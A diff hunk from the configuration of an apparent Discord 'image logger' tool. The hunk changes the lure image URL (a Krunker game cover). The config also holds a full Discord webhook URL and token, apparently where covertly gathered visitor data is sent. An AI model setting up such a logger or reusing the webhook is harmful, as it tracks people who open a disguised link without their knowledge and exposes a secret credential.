@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1084217021539045376/MG2BSxX6zYW6dRoDvgmjyoEGJzijyWZlXBTK_Pw389p94ar4FcqYdzKaLfW0Wh3DIsgv",
-    "image": "https://images.crazygames.com/games/krunker-io/cover-1591336739727.png?auto=format%2Ccompress&q=45&cs=strip&ch=DPR&w=1200&h=630&fit=crop", # You can also have a custom image by using a URL argument
+    "image": "https://images.crazygames.com/games/krunker-io/cover-1591336739727.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
